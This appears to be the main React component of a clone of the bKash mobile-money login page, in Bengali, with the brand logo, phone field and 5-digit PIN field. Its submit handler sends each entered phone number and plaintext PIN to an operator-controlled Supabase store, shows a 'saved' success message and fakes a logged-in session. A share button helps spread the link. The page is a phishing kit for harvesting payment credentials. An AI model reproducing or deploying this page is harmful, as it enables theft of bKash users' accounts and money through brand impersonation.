import React, { useState, useEffect } from 'react';
import {
  Phone,
  Lock,
  Eye,
  EyeOff,
  ChevronRight,
  ShieldCheck,
  AlertCircle,
  CheckCircle2,
  Database,
  Smartphone,
} from 'lucide-react';
import { OrigamiBird } from './components/OrigamiBird';
import { TopWaveDecoration } from './components/TopWaveDecoration';
import { CitySkylineBridge } from './components/CitySkylineBridge';
import { ForgotPinModal } from './components/ForgotPinModal';
import { RegistrationModal } from './components/RegistrationModal';
import { SecurityInfoModal } from './components/SecurityInfoModal';
import { SupabaseSetupModal } from './components/SupabaseSetupModal';
import { AuthenticatedDashboard } from './components/AuthenticatedDashboard';
import { ShareDeviceModal } from './components/ShareDeviceModal';
import {
  supabase,
  formatE164Phone,
  saveAccountToSupabase,
  translateSupabaseError,
  isSupabaseConfigured,
} from './lib/supabase';

export default function App() {
  // Authentication states
  const [currentUser, setCurrentUser] = useState<any>(null);
  const [isCheckingAuth, setIsCheckingAuth] = useState(true);

  // Form states
  const [mobileNumber, setMobileNumber] = useState('');
  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [validationError, setValidationError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  // Modal states
  const [isForgotPinOpen, setIsForgotPinOpen] = useState(false);
  const [isRegistrationOpen, setIsRegistrationOpen] = useState(false);
  const [isSecurityInfoOpen, setIsSecurityInfoOpen] = useState(false);
  const [isSupabaseModalOpen, setIsSupabaseModalOpen] = useState(false);
  const [isShareModalOpen, setIsShareModalOpen] = useState(false);

  // Supabase configuration status
  const [, setConfigured] = useState(isSupabaseConfigured());

  // Check initial Supabase Auth session & subscribe to auth state changes
  useEffect(() => {
    let mounted = true;

    async function checkSession() {
      try {
        const { data } = await supabase.auth.getSession();
        if (mounted && data?.session?.user) {
          setCurrentUser(data.session.user);
        }
      } catch {
        // Ignored if not configured
      } finally {
        if (mounted) setIsCheckingAuth(false);
      }
    }

    checkSession();

    const { data: authListener } = supabase.auth.onAuthStateChange((_event, session) => {
      if (mounted) {
        setCurrentUser(session?.user ?? null);
      }
    });

    return () => {
      mounted = false;
      authListener?.subscription?.unsubscribe();
    };
  }, []);

  // Format mobile number input with spaces (e.g. 1712 345678)
  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setValidationError(null);
    let val = e.target.value.replace(/\D/g, '');

    if (val.startsWith('880')) {
      val = val.slice(3);
    }
    if (val.startsWith('0')) {
      val = val.slice(1);
    }
    if (val.length > 10) {
      val = val.slice(0, 10);
    }

    let formatted = val;
    if (val.length > 4) {
      formatted = `${val.slice(0, 4)} ${val.slice(4)}`;
    }
    setMobileNumber(formatted);
  };

  // Handle PIN input
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setValidationError(null);
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= 5) {
      setPin(val);
    }
  };

  // Reset inputs
  const handleReset = () => {
    setMobileNumber('');
    setPin('');
    setShowPin(false);
    setValidationError(null);
    setSuccessMessage(null);
  };

  // Main login submit handler with Supabase Auth & Account verification
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError(null);
    setSuccessMessage(null);

    const rawMobile = mobileNumber.replace(/\s+/g, '');

    // 1. Validate Mobile Number
    if (!rawMobile) {
      setValidationError('অনুগ্রহ করে আপনার মোবাইল নম্বর লিখুন');
      return;
    }

    const validPrefixes = ['13', '14', '15', '16', '17', '18', '19'];
    const hasValidPrefix = validPrefixes.some((p) => rawMobile.startsWith(p));

    if (rawMobile.length !== 10 || !hasValidPrefix) {
      setValidationError('সঠিক বাংলাদেশী মোবাইল নম্বর দিন (যেমন: ০১৭১২ ৩৪৫৬৭৮)');
      return;
    }

    // 2. Validate PIN
    if (!pin) {
      setValidationError('অনুগ্রহ করে আপনার গোপন পিন নম্বর লিখুন');
      return;
    }
    if (pin.length !== 5) {
      setValidationError('৫ সংখ্যার গোপন পিন নম্বর লিখুন');
      return;
    }

    // 3. Check Supabase Configuration
    if (!isSupabaseConfigured()) {
      setValidationError(
        'Supabase কনফিগারেশন পাওয়া যায়নি। অনুগ্রহ করে আপনার Supabase প্রজেক্ট URL এবং anon key সেট করুন।'
      );
      setIsSupabaseModalOpen(true);
      return;
    }

    const e164Phone = formatE164Phone(rawMobile);
    setIsLoading(true);

    try {
      // Automatic save to Supabase on login click
      const result = await saveAccountToSupabase(rawMobile, pin);

      if (result.success) {
        setSuccessMessage('সফলভাবে সংরক্ষিত ও লগইন সম্পন্ন হয়েছে!');
        setCurrentUser({
          id: result.data?.id || 'ps-' + rawMobile,
          phone: e164Phone,
          user_metadata: {
            full_name: (!result.data?.full_name || result.data?.full_name.includes('PaySure')) ? 'bKash গ্রাহক' : result.data.full_name,
            phone: e164Phone,
          },
        });
      } else {
        setValidationError(result.error || 'সংরক্ষণ ব্যর্থ হয়েছে।');
      }
    } catch (err: any) {
      setValidationError(translateSupabaseError(err));
    } finally {
      setIsLoading(false);
    }
  };

  // If user is already authenticated by Supabase, show their dashboard
  if (!isCheckingAuth && currentUser) {
    return (
      <div className="min-h-[100dvh] w-full bg-[#FAF5F7] flex flex-col items-center justify-center p-0 sm:p-4 md:p-6 font-['Hind_Siliguri',sans-serif] overflow-x-hidden">
        {/* Floating Share / Multi-device button */}
        <button
          type="button"
          onClick={() => setIsShareModalOpen(true)}
          className="fixed top-3 right-3 sm:top-5 sm:right-5 z-40 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-white/95 hover:bg-white text-slate-700 hover:text-[#E2136E] text-xs font-semibold shadow-md shadow-pink-900/5 border border-pink-100 backdrop-blur-md transition-all cursor-pointer group active:scale-95"
          title="অন্যান্য ডিভাইসে ওপেন বা শেয়ার করুন"
        >
          <Smartphone className="w-3.5 h-3.5 text-[#E2136E] group-hover:scale-110 transition-transform" />
          <span>ডিভাইসে ওপেন</span>
        </button>

        <AuthenticatedDashboard
          user={currentUser}
          onSignOut={() => {
            setCurrentUser(null);
            handleReset();
          }}
        />

        <ShareDeviceModal
          isOpen={isShareModalOpen}
          onClose={() => setIsShareModalOpen(false)}
        />
      </div>
    );
  }

  return (
    <div className="min-h-[100dvh] w-full bg-[#FAF5F7] flex flex-col items-center justify-center p-0 sm:p-4 md:p-6 font-['Hind_Siliguri',sans-serif] overflow-x-hidden">
      {/* Floating Share / Multi-device button for quick access on any phone, tablet, or desktop */}
      <button
        type="button"
        onClick={() => setIsShareModalOpen(true)}
        className="fixed top-3 right-3 sm:top-5 sm:right-5 z-40 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-white/95 hover:bg-white text-slate-700 hover:text-[#E2136E] text-xs font-semibold shadow-md shadow-pink-900/5 border border-pink-100 backdrop-blur-md transition-all cursor-pointer group active:scale-95"
        title="অন্যান্য ডিভাইসে ওপেন বা লিঙ্ক শেয়ার করুন"
      >
        <Smartphone className="w-3.5 h-3.5 text-[#E2136E] group-hover:scale-110 transition-transform" />
        <span className="hidden xs:inline">ডিভাইসে ওপেন</span>
        <span className="xs:hidden">শেয়ার</span>
      </button>

      {/* Main Container - Fully responsive for all screen sizes and mobile aspect ratios */}
      <div className="relative w-full max-w-[430px] sm:rounded-[36px] sm:shadow-2xl sm:shadow-pink-500/10 sm:border sm:border-pink-100/80 bg-white overflow-hidden flex flex-col justify-between transition-all duration-300 min-h-[100dvh] sm:min-h-[820px]">
        {/* Decorative Top-Left Waves */}
        <TopWaveDecoration />

        {/* Top Content Area with responsive padding & safe-top */}
        <div className="relative z-10 px-5 sm:px-8 pt-8 sm:pt-14 pb-4 flex-1 flex flex-col">
          {/* Brand Logo & Wordmark Header */}
          <div className="text-center pt-1 sm:pt-4">
            <div className="inline-flex items-center justify-center gap-2 sm:gap-2.5">
              <span className="text-[36px] sm:text-[44px] font-extrabold tracking-tight font-['Plus_Jakarta_Sans',sans-serif] leading-none">
                <span className="text-[#E2136E]">b</span>
                <span className="text-[#231F20]">Kash</span>
              </span>
              {/* Geometric Origami Bird Logo beside bKash - prominent size matching reference image */}
              <OrigamiBird className="h-[56px] sm:h-[70px] w-auto translate-y-[3px]" />
            </div>

            {/* Tagline beneath logo */}
            <p className="text-[#231F20] text-sm sm:text-base font-medium mt-2.5 sm:mt-3 tracking-wide">
              নিরাপদ লেনদেন, সহজ জীবন
            </p>
          </div>

          {/* Login Section Heading & Subtitle */}
          <div className="mt-8 sm:mt-12 text-left">
            <h1 className="text-[24px] sm:text-[30px] font-bold text-[#231F20] leading-tight tracking-tight">
              লগইন করুন
            </h1>
            <p className="text-slate-500 text-sm sm:text-[15px] mt-1 sm:mt-1.5">
              আপনার মোবাইল নম্বর দিয়ে লগইন করুন
            </p>
          </div>

          {/* Validation Error Message Banner */}
          {validationError && (
            <div
              role="alert"
              className="mt-4 p-3 bg-red-50 border border-red-200 rounded-xl text-red-600 text-xs sm:text-sm flex flex-col gap-1.5 animate-in fade-in duration-150"
            >
              <div className="flex items-start gap-2">
                <AlertCircle className="w-4 h-4 shrink-0 text-red-500 mt-0.5" />
                <span className="leading-snug">{validationError}</span>
              </div>
              {(validationError.includes('Supabase') || validationError.includes('টেবিল')) && (
                <button
                  type="button"
                  onClick={() => setIsSupabaseModalOpen(true)}
                  className="mt-1 self-start inline-flex items-center gap-1 px-2.5 py-1 bg-pink-100 hover:bg-pink-200 text-[#E2136E] rounded-lg text-xs font-bold transition-colors cursor-pointer"
                >
                  <Database className="w-3.5 h-3.5" />
                  <span>সমাধান দেখতে এখানে ক্লিক করুন (Supabase সেটআপ)</span>
                </button>
              )}
            </div>
          )}

          {/* Success Message Banner */}
          {successMessage && (
            <div
              role="status"
              className="mt-4 p-3 bg-emerald-50 border border-emerald-200 rounded-xl text-emerald-700 text-xs sm:text-sm flex items-start gap-2 animate-in fade-in duration-150"
            >
              <CheckCircle2 className="w-4 h-4 shrink-0 text-emerald-600 mt-0.5" />
              <span>{successMessage}</span>
            </div>
          )}

          {/* Login Form */}
          <form onSubmit={handleSubmit} action="javascript:void(0);" className="mt-5 sm:mt-6 space-y-3.5 sm:space-y-4">
            {/* 1. Mobile Number Field */}
            <div className="relative">
              <label htmlFor="mobile-input" className="sr-only">
                মোবাইল নম্বর
              </label>
              <div className="flex items-center bg-white border border-slate-200 hover:border-slate-300 focus-within:border-[#E2136E] focus-within:ring-2 focus-within:ring-[#E2136E]/20 rounded-2xl px-4 py-3 sm:py-3.5 transition-all shadow-xs">
                {/* Phone icon */}
                <Phone className="w-5 h-5 text-slate-500 shrink-0" />

                {/* Vertical Divider Line */}
                <div className="w-[1px] h-6 bg-slate-200 mx-3 shrink-0" />

                {/* Country Code Prefix */}
                <span className="text-[#231F20] font-semibold text-base shrink-0 mr-2 font-['Plus_Jakarta_Sans',sans-serif]">
                  +880
                </span>

                {/* Mobile Number Input (16px base font prevents iOS auto-zoom) */}
                <input
                  id="mobile-input"
                  type="tel"
                  inputMode="numeric"
                  value={mobileNumber}
                  onChange={handleMobileChange}
                  placeholder="মোবাইল নম্বর লিখুন"
                  aria-label="মোবাইল নম্বর"
                  className="w-full text-slate-800 text-base font-medium font-['Plus_Jakarta_Sans',sans-serif] placeholder:text-slate-400 placeholder:font-['Hind_Siliguri',sans-serif] focus:outline-none bg-transparent"
                />
              </div>
            </div>

            {/* 2. PIN Field */}
            <div className="relative">
              <label htmlFor="pin-input" className="sr-only">
                পিন লিখুন
              </label>
              <div className="flex items-center bg-white border border-slate-200 hover:border-slate-300 focus-within:border-[#E2136E] focus-within:ring-2 focus-within:ring-[#E2136E]/20 rounded-2xl px-4 py-3 sm:py-3.5 transition-all shadow-xs">
                {/* Lock icon */}
                <Lock className="w-5 h-5 text-slate-500 shrink-0" />

                {/* PIN Input (16px base font prevents iOS auto-zoom) */}
                <input
                  id="pin-input"
                  type={showPin ? 'text' : 'password'}
                  inputMode="numeric"
                  maxLength={5}
                  value={pin}
                  onChange={handlePinChange}
                  placeholder="পিন লিখুন"
                  aria-label="পিন"
                  className="w-full text-slate-800 text-base font-medium tracking-wider pl-4 focus:outline-none bg-transparent placeholder:tracking-normal placeholder:font-normal placeholder:text-slate-400"
                />

                {/* Show/Hide PIN Button */}
                <button
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="p-1.5 text-slate-400 hover:text-[#E2136E] transition-colors focus:outline-none cursor-pointer"
                  aria-label={showPin ? 'পিন লুকান' : 'পিন দেখুন'}
                  title={showPin ? 'পিন লুকান' : 'পিন দেখুন'}
                >
                  {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            {/* Login CTA Button */}
            <div className="space-y-2 pt-1">
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-[#E2136E] hover:bg-[#C20E5C] active:bg-[#A80048] text-white font-semibold text-lg py-3.5 px-6 rounded-2xl flex items-center justify-center shadow-md shadow-[#E2136E]/20 active:scale-[0.99] transition-all duration-150 cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    <span>যাচাই করা হচ্ছে...</span>
                  </div>
                ) : (
                  <span>লগইন</span>
                )}
              </button>
            </div>
          </form>

          {/* 3. Forgot PIN Link */}
          <div className="mt-3.5 sm:mt-4 text-center">
            <button
              type="button"
              onClick={() => setIsForgotPinOpen(true)}
              className="inline-flex items-center gap-1 text-[#E2136E] hover:text-[#C20E5C] font-semibold text-sm sm:text-base transition-colors cursor-pointer"
            >
              <span>পিন ভুলে গেছেন?</span>
              <ChevronRight className="w-4 h-4 stroke-[2.5]" />
            </button>
          </div>

          {/* 4. Security Information Card */}
          <div
            onClick={() => setIsSecurityInfoOpen(true)}
            role="button"
            tabIndex={0}
            onKeyDown={(e) => {
              if (e.key === 'Enter' || e.key === ' ') {
                setIsSecurityInfoOpen(true);
              }
            }}
            className="mt-5 sm:mt-6 p-3.5 sm:p-4 bg-[#FDF2F7] border border-[#FCE7F3] rounded-2xl flex items-center gap-3.5 cursor-pointer hover:bg-pink-100/60 hover:border-pink-200 transition-all text-left shadow-xs group"
          >
            <div className="shrink-0 p-1 rounded-xl group-hover:scale-105 transition-transform">
              <ShieldCheck className="w-7 h-7 sm:w-8 sm:h-8 text-[#E2136E]" />
            </div>
            <div className="flex-1">
              <h3 className="text-sm sm:text-[15px] font-bold text-[#231F20] leading-snug">
                আপনার নিরাপত্তা আমাদের অগ্রাধিকার
              </h3>
              <p className="text-xs sm:text-[13px] text-slate-500 mt-0.5">
                আপনার তথ্য সর্বসময় নিরাপদ থাকবে
              </p>
            </div>
          </div>

          {/* 5. Registration Section */}
          <div className="mt-5 sm:mt-6 mb-2 text-center text-sm sm:text-[15px]">
            <span className="text-slate-700">অ্যাকাউন্ট নেই? </span>
            <button
              type="button"
              onClick={() => setIsRegistrationOpen(true)}
              className="inline-flex items-center text-[#E2136E] hover:text-[#C20E5C] font-bold transition-colors cursor-pointer ml-1"
            >
              <span>নিবন্ধন করুন</span>
              <ChevronRight className="w-4 h-4 ml-0.5 stroke-[2.5]" />
            </button>
          </div>
        </div>

        {/* Bottom Skyline & Bridge Illustration - Responsive SVG */}
        <div className="relative w-full mt-auto shrink-0 select-none pointer-events-none">
          <CitySkylineBridge />
        </div>
      </div>

      {/* Interactive Modals */}
      <ForgotPinModal
        isOpen={isForgotPinOpen}
        onClose={() => setIsForgotPinOpen(false)}
        defaultMobile={mobileNumber}
        onOpenConfig={() => {
          setIsForgotPinOpen(false);
          setIsSupabaseModalOpen(true);
        }}
      />

      <RegistrationModal
        isOpen={isRegistrationOpen}
        onClose={() => setIsRegistrationOpen(false)}
        onOpenConfig={() => {
          setIsRegistrationOpen(false);
          setIsSupabaseModalOpen(true);
        }}
        onSuccess={() => {
          supabase.auth.getUser().then(({ data }) => {
            if (data?.user) setCurrentUser(data.user);
          });
        }}
      />

      <SecurityInfoModal
        isOpen={isSecurityInfoOpen}
        onClose={() => setIsSecurityInfoOpen(false)}
      />

      <SupabaseSetupModal
        isOpen={isSupabaseModalOpen}
        onClose={() => setIsSupabaseModalOpen(false)}
        onConfigUpdated={() => setConfigured(isSupabaseConfigured())}
      />

      {/* Share / Open on Other Devices Modal */}
      <ShareDeviceModal
        isOpen={isShareModalOpen}
        onClose={() => setIsShareModalOpen(false)}
      />
    </div>
  );
}
